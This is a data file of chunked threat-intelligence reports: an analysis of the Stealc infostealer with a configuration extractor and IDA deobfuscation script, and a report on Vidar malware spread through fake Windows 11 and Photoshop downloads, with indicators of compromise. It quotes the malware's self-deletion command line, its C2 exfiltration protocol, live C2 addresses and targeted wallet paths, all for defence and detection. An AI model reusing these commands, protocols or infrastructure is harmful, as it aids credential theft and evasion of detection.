text|source|chunk_id
"Stealc: a copycat of Vidar and Raccoon infostealers gaining in popularity – Part 2 blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularity-part-2/ 27 February 2023

Threat & Detection Research Team February 27 2023 232 0 Read it later Remove 16 minutes reading

Context This report is a follow up of the previous blog post on Stealc. Stealc is an information stealer advertised on the underground forums XSS, Exploit and BHF by the Plymouth threat actor. In this blog post, we focus on the technical analysis of a standalone sample. Similarities were observed with Vidar, Raccoon and Mars stealers during the reverse engineering phase. Functionalities implemented in Stealc, including environment detection, anti-analysis, strings obfuscation, dynamic API resolution, a significant list of targeted browsers, extensions, wallets and installed software makes it a top-tier threat within the infostealer ecosystem.

Malware analysis The next sections list the different techniques observed during the reverse engineering of Stealc to provide information and detailed explanations on Stealc operations and behaviors. All details of the infection chain, distribution and tracking of this threat were provided in part 1. Stealc sample SHA-256 used for the analysis is: 77d6f1914af6caf909fa2a246fcec05f500f79dd56e5d0d466d55924695c702d Stealc sample SHA-256 with a next stage configured is: 1587857ad744c322a2b32731cdd48d98eac13f8aa8ff2f2afb01ebba88d15359"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|1f425b054a774128b970fa51b6f4a30d
"Anti analysis The malware implements anti-analysis techniques by adding unconditional jump to a nearby offset, confusing the decompiler that cannot grasp the pointed function. As shown in figure 1, the decompiler analyzed a function with multiple jump instructions (jz, jnz opcodes), with a destination address defined to the next address plus an offset of 1 or 2 (depending on the case). This results in the decompiler not making a correct assumption and avoiding decompiling the function.

1/14

Figure 1. Wrong disassembly of the main function due to Stealc implemented anti-analysis technique Rebuilding the function by setting the location to undefined and patching the previous byte of the location with a NOP instruction, decompilers can work properly. When applying this technique, the decompiled opcodes are the following:

Figure 2. Patched function that can be correctly decompiled by IDA Here, the instructions mov eax, 9DE9h (B8 E8 9D 00 00) are wrongly disassembled because of the location+1. Undefining the location, replacing the B8 of the mov instruction by a NOP(0x90) and re-defining the beginning of the next instruction to E8 results in the correct disassembly of this code section.

Figure 3. Jump in the middle trick patching example

2/14

Main function overview Following the patching of the sample, the main function of Stealc shows similarities to the one analyzed in Raccoon and Mars stealers reverses, notably in terms of operation order and used techniques."|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|91a036b923934e25a8c06bcde74004b5
"Figure 4. Main function overview

The execution flow of Stealc is straightforward, it first deobfuscates strings used for further dynamic API resolution. Then, it performs various checks on the infected host to exit on particular conditions, it also checks the amount of RAM and whether it is executed by an antivirus solution. Finally, it verifies that the current date is preceding the hardcoded one. After this initial setup and detection, the malware goes to the function responsible for the C2 interaction, in which the stealer configuration is downloaded, and data are exfiltrated.

Defeating string encryption The malware stores its strings and part of its configuration is obfuscated. Stealc data are RC4-encrypted and base64-encoded. The key for decryption is stored in the PE in cleartext, as seen in the first variable assignment in figure 5.

3/14

Figure 5. Base64

decoding and RC4 decryption function For further analysis, an IDA script to decrypt the strings and assign their value to the correct DWORD is provided in annex 2.

Dynamic API resolution To reduce its detection rate by antivirus solutions, Stealc uses the Dynamic API Resolution (T1027.007) technique. To do so, the malware searches for the kernel32 base address using the PE header structure and goes through LDR_DATA_TABLE_ENTRY. Then, it iterates over the table until it matches the GetProcAddress function and returns the address of the dedicated entry.

Figure 6. Debugging of"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|b9bb11d29cfc4440a90cc877b30a3fc4
"Figure 6. Debugging of

the search GetProcAddess of Kernel32.dll In figure 6, register EAX is used to store kernel32 base address: 1. Register fs:000030h is the address of the ProcessEnvironmentBlock (PEB) member of the ThreadEnvironmentBlock (TEB) structure ; 2. The offset 0xC of the PEB structure is the LDR_DATA structure member that contains a pointer to the InMemoryOrderModuleList member; 3. InMemoryOrderModuleList is a structure of type LIST_ENTRY whose member DllBase is pointer to Kernel32 (see figure6) Once the malware obtains the address of GetProcAddress, it loads the function LoadLibrary and other functions from kernel32 including OpenEventA, CreateEventA, Sleep, VirtualAlloc, etc. LoadLibrary is used to load advapi32, gdi32, user32, crypt32 and ntdll DLLs, only specific functions of these libraries are loaded afterwards. 4/14

Figure 7.

Extract of the function used to load extra libraries and their methods Subscribe to our newsletters"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|f2cf65d30e584761a8d96f646eeb7b6e
"Figure 7.

Extract of the function used to load extra libraries and their methods Subscribe to our newsletters

Environment detection & checks Stealc attempts to detect its environment for two purposes: 1. Exit in particular conditions (sandbox environment, unwanted location, etc.) 2. Host fingerprinting The malware implements the following exit conditions: Username is JohnDoe (Windows Defender emulator default username); Hostname is HAL9TH (Windows Defender emulator default hostname); Configured language is Russian; Expiration date is overdue, a date is hardcoded in the binary, if this date is passed, the malware exits. This is almost certainly a functionality added to the build by the developer(s) as part of their business model; Section .text should be writable (by default Stealc configures its .text with write permission). RAM capacity is below 1 GB; No display is configured."|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|12c6f0d0cf9f4b36bef221fc172451b7
"Miscellaneous functionalities Stealc also implements functionalities common to other malware of the stealer family. It has the capability to take a screenshot of the infected host and to fingerprint the infected machine. To retrieve this information, the sample queries the suitable registry keys and interacts with the Windows API. The fingerprinted information are: Public IP address; Geolocation; Hardware ID; Operating System version; Architecture; Username; Computer name; Local time; Language; Keyboard layout; Physical resources: CPU (core, name), RAM, number of threads, display resolution and GPU driver; List of running processes; List of installed applications.

Command and Control communication

5/14"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|90da6eb732dc415093fc29c259e4361b
"The malware communicates over HTTP, data are sent in POST requests that use multi-form structure whose forms are the stolen data encoded in base64. In the first interaction, the infected host sends its HWID (hardware ID) and its build name (the value is “default“). The server responds with the following base64 string: MWZjZTYzMTFhZDg1NmUzYTVjNTQ5OTQ0NDU0NWJmOGJjNjc2MDc0YTY3ZWIwZDJiMmZiNTQwMWE4OTMxODM3Y2NiZDlhMTllfGlzZG9uZ The decoded content from the base64 format is: 1fce6311ad856e3a5c5499444545bf8bc676074a67eb0d2b2fb5401a8931837ccbd9a19e|isdone|docia.docx|1|1|0|1|1|1|1|1| The first hash is, in fact, an identifier used as a token for all communications, and sent in a dedicated form for each message. The early communications of the malware aim at downloading the configuration of the stealer, for instance the path and file patterns to look for on the infected host, the wallets or extensions to search, etc. The stealer gets its configuration from the C2, with a POST request whose two forms are sent. The form name “message” indicates which type of data will be sent, it could be “browser“, “plugin“, “wallets” or “files“. The structure of the C2 response (for the configuration) is always the same, data are concatenated with the pipe character | (see figure 9). It repeats this same operation for each browser, their extensions, for the wallets and installed applications. The list of targeted assets is provided in the part 1 of Stealc analysis in the annex 1 – Stealc capabilities."|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|56e5117286cb4d279f95752a3b3c96e8
"Figure 8. Downloaded configuration encoded in base64 After downloading the bot configuration, the stealer sends the fingerprinted information (see section Miscellaneous functionalities for the list of fingerprinted information that are exfiltrated). The table below displays communications between the infected host and Stealc C2. Request

Request forms

Response

Functionality

POST main URL

hwid, build name

token

POST main URL

token, message=”browsers”

browsers

configuration

configure the browsers stealing

operation

POST main URL

token, message=”plugins”

plugins

configuration

configure the plugins stealing

operation

Register infected host and download configuration

6/14

POST main URL

token, host fingerprint

(RAM, OS, apps, etc)

Target Chromium



based browsers (e.g. Chrome,

Chromium, Edge)

download

sqlite3.dll

GET DLLs URL sqlite3.dll

POST main URL

token, file_name, file

Chrome cookies

POST main URL

token, file_name, file

Chrome history

POST main URL

token, file_name, file

Chrome extensions (exfiltrated

each file separately)

GET DLLs URL freebl3.dll

download

freebl3.dll

GET DLLs URL mozglue.dll

download

mozglue.dll

GET DLLs URL msvcp140.dll

download

msvcp140.dll

GET DLLs URL nss3.dll

download

nss3.dll

GET DLLs URL softoknn3.dll

download

softokn3.dll

GET DLLs URL vcrunctime140.dll

download

vcrunctime140.dll"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|c339121c29644b3188266e70a3b845fb
"download

nss3.dll

GET DLLs URL softoknn3.dll

download

softokn3.dll

GET DLLs URL vcrunctime140.dll

download

vcrunctime140.dll

Target Firefox-based browsers, repeat the actions executed for Chromium-based Target Opera-based browsers, same actions executed for Chromium-based POST main URL

token, message=”wallets”

list of targeted

wallets

configure the wallets stealing

operation

POST main URL

token, message=”files”

file grabber

configuration

configure the file grabber

POST main URL

token, file_name, file

exfiltrate each file matching the grabber configuration

POST main URL

token, file_name, file

send the screenshot

POST main URL

token, message=isdone

Target desktop applications: Outlook, Steam, Tox, Pidgin, Discord, Telegram

GET unrelated URL to Stealc infrastructure

Next stage URL

Get the URL of the next stage to execute

Executable

Download the next stage"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|e6c069fa0a95455b970634a8c93641ba
"GET unrelated URL to Stealc infrastructure

Next stage URL

Get the URL of the next stage to execute

Executable

Download the next stage

Table 1. Table of Stealc’s HTTP communications with the C2 main url: 752e382b4dcf5e3f.php DLLs url: /dbe4ef521ee4cc21/ For each browser, wallets, plugins, the same actions are repeated and the forms are the same. The last communication is optional, this request is sent only if Stealc has a next stage configured on its panel. File grabber After stealing data from targeted browsers and their extensions, the stealer uses its file grabber functionality. The grabber configuration is received from the C2 and is formatted as follow: standart|%DESKTOP%\\|*.txt,*.doc,*.docx,*.xls|7000|1|0| The structure of the configuration is the following one. First a name, then a directory or a shortcut to a directory (here the desktop), thirdly a list of file extensions that the malware wants to exfiltrate and finally the maximum size. We also identified 2 extra parameters that were not useful for the analysis.

7/14

In case the file name and path match the grabber filters, it is exfiltrated in a POST request to the C2 with three forms. Form ID

Form name

Form value

1

token

The token value provided by the C2 in the earlier communication

2

file_name

The full file path to the stolen file encoded in base64

3

file

The file content encoded in base64

Table 2. List of forms and their content when conditions for exfiltration are met"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|f0b5ea4371c8425bbb5f1e8f4ed6f4a2
"3

file

The file content encoded in base64

Table 2. List of forms and their content when conditions for exfiltration are met

Figure 9. Example of a file exfiltrated by the file grabber DLLs loading To access particular files or data, Stealc requires external DLLs that are not embedded in the PE but rather downloaded from a specific URL hosted by the C2. The downloaded DLLs are: 1. sqlite3.dll 2. freebl3.dll 3. mozglue.dll 4. msvcp40.dll 5. nss3.dll 6. softokn3.dll 7. vcruntime140.dll The DLLS are all written in the C:\ProgramData\ directory and are then loaded (TTP: Shared Module: T1129). Of note, only specific functions are loaded by the malware.

Figure 10.

Sqlite3.dll function loading

8/14

After loading the required functionalities from the DLLs, Stealc exploits them to access data of interest, Similarly, when a targeted data is found on the infected host, it is sent to the C2 using a POST request and encoding data in base64. As described in this section, Stealc can be noisy in case many files are exfiltrated to the C2."|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|1fd18d4563d345c39cbcc0da7ce51f82
"Next Stage As other analysed stealers observed upgrading their set of functionalities, Stealc is also able to download and execute a next stage payload. The next stage is configured by the request containing the form “isdone” or “done”, depending on the sample. The C2 responds with a base64 data containing the URL of the next stage to download. The sample (Stealc SHA-256: 1587857ad744c322a2b32731cdd48d98eac13f8aa8ff2f2afb01ebba88d15359) is configured to execute a next stage which is a Laplas Clipper, here is the response of Stealc C2 to configure the next stage, the next payload is configured by an URL that Stealc download and execute (see figure 15).

Figure 11. Next stage configuration

9/14

Figure 12.

Decompiled function for the execution and download of the next

Trace removal Stealc attempts to reduce its infection traces by removing itself and its downloaded DLLs (T1070.004) with the following one-line command: cmd.exe /c timeout /t 5 & del /f /q ""$STEALERPATH"" & del ""C:\ProgramData\*.dll"" & exit

The command is executed with a basic ShellExecuteA function from Shell32.dll."|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|e9840ab088d44b64ad2c67e0ac689455
"The command is executed with a basic ShellExecuteA function from Shell32.dll.

Conclusion Stealc displays all functionalities and behaviors to be a viable tool in the information stealer catalog, and will almost certainly be incorporated in multiple intrusion sets’ toolsets, either as a shift or an expansion of their capabilities. Based on observed similarities between Stealc and other malware of the infostealer family, notably Raccoon and Mars stealer, SEKOIA.IO analysts assess it is likely a confirmation of a transmission and circulation of knowledge, including source code, and of human resources, in the Russian-speaking cybercriminal ecosystem. SEKOIA.IO analysts expect Stealc developer will almost certainly continue to update its stealer with new and / or improved features in the near term to meet customers’ expectations and expand its customer base. To provide our customers with actionable intelligence, SEKOIA.IO analysts will continue to monitor emerging and prevalent infostealers, including Stealc.

Annex 1 – Configuration extraction As introduced in the strings obfuscation section, Stealc embeds the address of the C2 and its different URLs in the rdata section of the PE. Based on our observation, the script should meet the following requirements: 1. Retrieve the RC4 key in rdata; 2. Deobfuscate the strings until all patterns related to the C2 are spotted.

10/14"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|8e029a579b38498a8ba35b0920ed6645
"10/14

The RC4 key is hardcoded in the PE in cleartext and by definition RC4 keys are 20 bytes long. Stealc C2 information are stored with the following structure: C2 base URL: http://<ip or domain> or https://<ip or domain>; C2 URL resource which is a random string ending by .php extension; C2 directory name where the DLLs are hosted (nss3.dll, sqlite3.dll, etc…). The provided configuration extractor simply loops over that section to find the patterns described previously.

11/14

from base64 import b64decode from pefile import PE, SectionStructure from cryptography.hazmat.primitives.ciphers import Cipher, algorithms

class Stealc: """"""Stealc configuration"""""" rc4_key: bytes = b"""" base_url: str = """" endpoint_url: str = """" dlls_directory: str = """" def __str__(self): out = f""Stealc RC4 key: {self.rc4_key}\n"" out += f""SteaC Command and Control:\n"" out += f""\t- {''.join([self.base_url, self.endpoint_url])}\n"" out += f""\t- {''.join([self.base_url, self.dlls_directory])}\n"" return out def rc4_decrypt(self, data: bytes) -> bytes: """"""decrypt RC4 data with the provided key."""""" algorithm = algorithms.ARC4(self.rc4_key) cipher = Cipher(algorithm, mode=None) decryptor = cipher.decryptor() return decryptor.update(data)"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|e6c1fed2f63b49feaaee405bd88ef10b
"def get_section(pe: PE, section_name: str) -> SectionStructure: """"""return section by name, if not found raise KeyError exception."""""" for section in filter( lambda x: x.Name.startswith(section_name.encode()), pe.sections ): return section available_sections = "", "".join( [_sec.Name.replace(b""\x00"", b"""").decode() for _sec in pe.sections] ) raise KeyError( f""{section_name} not found in the PE, available sections: {available_sections}"" )

def get_rdata(pe_path: str)



> SectionStructure:

""""""Extract Stealc radata section""""""

pe = PE(pe_path)

section_rdata = get_section(pe, "".rdata"")

return section_rdata

def is_valid_string(data: bytes) -> bool: return True if all(map(lambda x: x >= 43 and x <= 122, data)) else False"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|504a74f9037f4358b02e5316f9311cb5
"return section_rdata

def is_valid_string(data: bytes) -> bool: return True if all(map(lambda x: x >= 43 and x <= 122, data)) else False

def search_Command_and_Control(stealc: Stealc, rdata_section: SectionStructure): """""" Search two types of strings in rdata section of Stealc: 1. The RC4 key which is 20 bytes long; 2. Strings matching the way Stealc stores its C2 configuration (these strings are decoded (base64 decode + RC4 decryption), This works for the Stealc version at least until 15 Feb 2023 but could change in new versions... 2.1 base url (`http://something...` or `https://something...`) 2.2 endpoint which ends with `.php` 2.3 DLLs directory starts and ends with `/` (eg: `/something_random/`) """""" for string in filter( lambda x: x and is_valid_string(x), rdata_section.get_data().split(b""\x00"" * 2) ): if len(string) == 20 and not stealc.rc4_key: # Hopefully the RC4 key is stored as the beginning of the rdata section stealc.rc4_key = string print(f""[+] RC4 key found: {stealc.rc4_key}"") if stealc.rc4_key and string != stealc.rc4_key: try: cleartext = stealc.rc4_decrypt(b64decode(string))

12/14"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|66ffa50786454ded8fa3ae4ccee57647
"12/14

# print(f""{string.decode():<40} {cleartext}"") if cleartext.startswith(b""http://"") or cleartext.startswith( b""https://"" ): print(f""[+] Found StealC Command and Control"") stealc.base_url = cleartext.decode() elif cleartext.startswith(b""/"") and cleartext.endswith(b""/""): print(f""[+] Found DLLs URL directory name"") stealc.dlls_directory = cleartext.decode() elif cleartext.endswith(b"".php""): print(f""[+] Found StealC endpoint"") stealc.endpoint_url = cleartext.decode() except Exception: pass

if __name__ == ""__main__"": import sys if len(sys.argv) < 2: print(f""not enough parameter, please provide as argument the path to stealc sample."") stealc = Stealc() rdata = get_rdata(sys.argv[1]) search_Command_and_Control(stealc, rdata) print(stealc)

Annex 2 – IDA script for string deobfuscation

13/14

from idaapi import * from ida_bytes import * from ida_name import * from base64 import b64decode from string import ascii_letters, digits from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|38d87cf1cc754c6ca5222e052d113b7c
"def read_rdata(name: str) -> str: print(f""read_rdata: {name}"") addr = get_name_ea_simple(name) size = get_max_strlit_length(addr, ida_nalt.STRENC_DEFAULT) return get_bytes(addr, size - 1) def rc4_decrypt(key: bytes, data: bytes) -> bytes: algorithm = algorithms.ARC4(key) cipher = Cipher(algorithm, mode=None) decryptor = cipher.decryptor() return decryptor.update(data) def deobfuscate_string(base: int, end: int , KEY: bytes): ea = base size = 0 clear = [] addr = [] while ea <= end: flags = ida_bytes.get_flags(ea) if ida_bytes.is_code(flags): instr_str = idc.generate_disasm_line(ea, 1) instr_str = "" "".join(instr_str.split()) if instr_str.startswith(""push offset a"") or instr_str.startswith(""mov dword ptr [esp], offset a""): value = instr_str.split(""offset"")[-1].split(';')[0].strip() value = read_rdata(value) clear.append(rc4_decrypt(KEY, b64decode(value))) elif instr_str.startswith(""mov dword_""): temp = instr_str.replace(""mov dword_"", """") temp = temp.split()[0].replace("","","""") addr = int(temp, 16) string = get_bytes(addr, size) cleartext = clear.pop(-1) cleartext = cleartext.decode() idc.set_cmt(ea, cleartext, 0) text = """" for c in cleartext: if c in f""{ascii_letters}{digits}"": text += c else: text += ""_"" cleartext = f""str_{text}"" print(f""replace dword_{addr:x} by `{cleartext}`"") set_name(addr, cleartext) ea += 1"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|af3fa8c519ad4716bf59e761eb87cf8e
"Subscribe to our newsletters Thank you for reading this blogpost. You can also consult other results of surveys carried out by our analysts on the ecosystem of infostealers :

14/14"|data_input/vidar_reports/entry_5cf2a088-c84e-4a8b-9fb4-217d4c10fc56.text|3abf51d0a14d461f9528b3a21bb9659f
"Microsoft Windows 11 help Files have Vidar Spyware zscaler.com/blogs/security-research/vidar-distributed-through-backdoored-windows-11-downloads-and-abusing

Summary In April 2022, ThreatLabz discovered several newly registered domains, which were created by a threat actor to spoof the official Microsoft Windows 11 OS download portal. We discovered these domains by monitoring suspicious traffic in our Zscaler cloud. The spoofed sites were created to distribute malicious ISO files which lead to a Vidar infostealer infection on the endpoint. These variants of Vidar malware fetch the C2 configuration from attacker-controlled social media channels hosted on Telegram and Mastodon network. ThreatLabz believes that the same threat actor is actively leveraging social engineering to impersonate popular legitimate software applications to distribute Vidar malware, as we have also identified an attacker-controlled GitHub repository which hosts several backdoored versions of Adobe Photoshop. These binaries hosted on GitHub, distribute Vidar malware using similar tactics of abusing social media channels for C2 communication. In this blog, ThreatLabz analyzes the Vidar distribution vector, threat actor correlation, and technical analysis of the binaries involved in this campaign."|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|b2aeb87062844e5fb1119946cb2d4b12
"Key points ThreatLabz discovered several newly registered domains spoofing the official Microsoft Windows 11 OS download portal The spoofed domains were distributing malicious ISO files containing samples of the Vidar infostealer malware The actual C2s used by the malware samples are obtained from attacker-controlled social media channels hosted on Telegram and Mastodon network Using data obtained from this campaign, ThreatLabz was also able to identify another similar one using backdoored versions of Adobe Photoshop

Distribution Vector - Windows 11 Theme The threat actor registered several domains beginning 20th April 2022 that host web pages that masquerade as the official Microsoft Windows 11 download page, which is the latest version of the operating system. ThreatLabz found several other domains registered by this threat actor similar to the one shown below in Figure 1. All of these domains were used to spread malicious ISO files spoofed as a Windows 11 download.

1/13

Figure 1: Vidar attacker-controlled domain serving malicious ISO file The complete list of domains linked to this threat actor that were used in this campaign are mentioned in the Indicators of Compromise (IOC) section."|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|4282c2c57b5e467c934f658c4f9ca933
"Technical Analysis ISO file The binary inside the ISO file is a PE32 binary. The size of the ISO file is very large (more than 300 MB), which helps the attackers evade network security products where there is a file size limitation in place. Example MD5 hashes for this campaign are shown below: ISO file MD5 hash: 52c47fdda399b011b163812c46ea94a6 PE32 file MD5 hash: 6352540cf679dfec21aff6bd9dee3770 The binary inside the ISO file is digitally signed with a certificate by AVAST. However, this certificate is expired and hence invalid. Figure 2 shows the details of the certificate and the corresponding serial number.

2/13

Figure 2: Details of the certificate used to sign the malicious Vidar binary All of the binaries in this campaign were signed by a certificate with the same serial number. By pivoting on this serial number, we were able to discover several other malicious binaries from multiple different campaigns and actors, which likely indicates that this is a stolen certificate coming from the AVAST compromise back in 2019."|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|f4b98b1cee3748989e472bf2bcfff501
"Vidar Samples The Vidar samples in these campaigns are all packed with Themida (except for the MD5 hash 6ae17cb76cdf097d4dc4fcccfb5abd8a) and over 330MB in size. However, the sample contains a PE file that is only around 3.3MB. Figure 3 shows that the rest of the file content is just artificially filled up with 0x10 bytes to increase the file’s size. The Vidar strings extracted from these samples is provided in the Appendix section at the end of the blog.

Figure 3: Padding of bytes to inflate the Vidar binary size from 3.3MB to 330MB All of the binaries below are related to the same Windows 11 theme campaign:

3/13

MD5: 6352540cf679dfec21aff6bd9dee3770"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|9e0360d151c84a719a0b851bf14edb13
"3/13

MD5: 6352540cf679dfec21aff6bd9dee3770

The Vidar static configuration below contains the embedded parameters needed by the sample to communicate with its C2 and information including the malware version: Profile: 670 Profile ID: 739 Version: 51.9 URL marker: hello URL1: https://t.me/btc20220425 Real C2: 195.201.250.209 (Carved out from URL1) URL2: https://ieji.de/@ronxik213 Real C2: 107.189.11.124 (Carved out from URL2) The botnet can be identified by its profile ID. Both of the hardcoded URLs are from social media sites. However, they are used as a dead drop resolver as a first stage. The URL marker instructs Vidar to parse the second stage URL from the social media profiles located at the dead drop resolver. The following is an example Vidar stealer configuration downloaded from the C2: 1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*."|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|02b079516c434e73b668baf7363379d9
"MD5: da82d43043c101f25633c258f527c9d5 MD5: e9a3562f3851dd2dba27f90b5b2d15c0 Vidar static configuration: Profile: 1281 Profile ID: 755 Version: 51.9 URL marker: hello URL1: 5.252.178.50 URL2: https://koyu.space/@ronxik123 Real C2: 107.189.11.124 (Carved out from URL2) For these samples, the URL1 field in the static configuration is a real C2, and a social media profile is used as a backup URL. The Vidar stealer configuration downloaded from this C2 was the following: 1,1,0,1,1,1,1,0,0,1,250,none; This configuration is customized to extract social media passwords with all of the other Vidar features disabled. The libraries downloaded from the C2 are the same as the previous sample with the same update.zip (66cf4ebdceedecd9214caab7ca87908d).

Distribution Vector - Adobe Photoshop Theme ThreatLabz also identified an attacker-controlled GitHub repository which hosts backdoored versions of the application Adobe Photoshop Creative Cloud, which we attribute to the same threat actor. Figure 4 shows the GitHub repository (https://github.com/AdobeInstal) used by the attacker to host a backdoored version of Adobe Photoshop.

4/13

Figure 4: Vidar attacker



controlled GitHub repository

Technical Analysis The sample with the MD5 hash below belongs to this Adobe Photoshop theme campaign."|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|acd63a732c9949479d532755d41e4c6e
"controlled GitHub repository

Technical Analysis The sample with the MD5 hash below belongs to this Adobe Photoshop theme campaign.

MD5 6ae17cb76cdf097d4dc4fcccfb5abd8a Vidar static configuration: Profile: 1199 Profile ID: 0 Version: 51.8 URL marker: hello URL1: https://t.me/mm20220428 Real C2: 195.201.250.209 (Carved out from URL1) URL2: https://koyu.space/@ronxik123 Real C2: 107.189.11.124 (Carved out from URL2) The Vidar stealer configuration downloaded from the C2 was the following: 1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*. *:*c The libraries downloaded from the C2 are the same as the previous sample with the same update.zip (66cf4ebdceedecd9214caab7ca87908d).

Social media abuse for C2 communication All the binaries involved in this campaign fetch the IP addresses of the C2 servers from attacker-registered social media accounts on the Telegram and Mastodon networks. In the past, the threat actors distributing Vidar have abused other social media networks such as Mastodon. However, the abuse of Telegram is a new tactic that they added to their arsenal."|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|22d1c3289f894d078f759db81d98c917
"Telegram abuse In these campaigns, the threat actor created several Telegram channels with the C2 IP address in the channel description. The format used to store the C2 IP address on social media profiles is the following for this campaign: <C2_Url_Marker> <C2_IP_address>| The C2_Url_Marker field in these campaigns was hello. The naming convention for the Telegram channels includes a date that corresponds to the date when these channels were created. As an example, the channel with the handle btc20220425 corresponds to a channel created on April 25, 2022, using btc_stacking as the name as shown in Figure 5.

5/13

Figure 5: Vidar attacker-controlled Telegram channel with the C2 IP address included in the channel description

Mastodon network abuse The Mastodon network is a decentralized social network which allows anyone to deploy their own instance of a self-hosted online community. There are several instances of such online communities on the Internet, which are built using Mastodon. Two such instances are ieji[. ]de and koyu[.]space. The threat actor created a profile on both of these communities and stored the C2 IP address in the profile section using a format similar to the one used for Telegram channels. Figure 6 and Figure 7 show the profiles created by the threat actor on ieji[. ]de and koyu[. ]space, respectively.

6/13

Figure 6: Vidar attacker-controlled profile on the Mastodon community ieji[. ]de with the C2 IP address included in the channel description"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|bc2b8d885c96404bb46038f40aa226cb
"6/13

Figure 6: Vidar attacker-controlled profile on the Mastodon community ieji[. ]de with the C2 IP address included in the channel description

Figure 7: Vidar attacker-controlled profile on Mastodon community koyu[. ]space with the C2 IP address included in the channel description

Conclusion The threat actors distributing Vidar malware have demonstrated their ability to social engineer victims into installing Vidar stealer using themes related to the latest popular software applications. As always, users should be cautious when downloading software applications from the Internet and download software only from the official vendor websites. The Zscaler ThreatLabZ team will continue to monitor this campaign, as well as others, to help keep our customers safe.

Zscaler cloud sandbox detection

7/13

Figure 8: Zscaler cloud sandbox detection In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators at various levels. Win32.Downloader.Vidar Win64.Downloader.Vidar

Indicators of compromise

Hashes

52c47fdda399b011b163812c46ea94a6

da82d43043c101f25633c258f527c9d5

e9a3562f3851dd2dba27f90b5b2d15c0

6ae17cb76cdf097d4dc4fcccfb5abd8a

Domains

ms



win11[. ]com

ms



win11.midlandscancer[. ]com

win11



serv4[. ]com

win11



serv[. ]com

win11install[. ]com

ms



teams



app[. ]net

URLs for fetching C2 addresses https://t.me/btc20220425 https://ieji.de/@ronxik213 https://koyu.space/@ronxik123 https://t.me/mm20220428"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|824387909cbc4e7591c94f5133a1918e
"app[. ]net

URLs for fetching C2 addresses https://t.me/btc20220425 https://ieji.de/@ronxik213 https://koyu.space/@ronxik123 https://t.me/mm20220428

URLs for fetching ISO files files.getsnyper[. ]com/files/msteams/Setup.iso files.getsnyper[. ]com/files/windows11/Setup.iso files.getsnyper[. ]com/files/msteamsww/Setup.iso

Actual C2s

195.201.250.209

107.189.11.124

5.252.178.50

107.189.11.124

Appendix

Decoded Strings

Wallets

Plugins



wallet



.dat

\\Wallets\\

keystore

Ethereum\

\\Ethereum\\

Electrum

\\Electrum\\wallets\\

ElectrumLTC

\\Electrum



LTC\\wallets\\

Exodus

\\Exodus\\

exodus.conf.json

window



state.json

8/13"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|19bae2fcf2d24a56b91ca2a93bf4a039
"Electrum

\\Electrum\\wallets\\

ElectrumLTC

\\Electrum



LTC\\wallets\\

Exodus

\\Exodus\\

exodus.conf.json

window



state.json

8/13

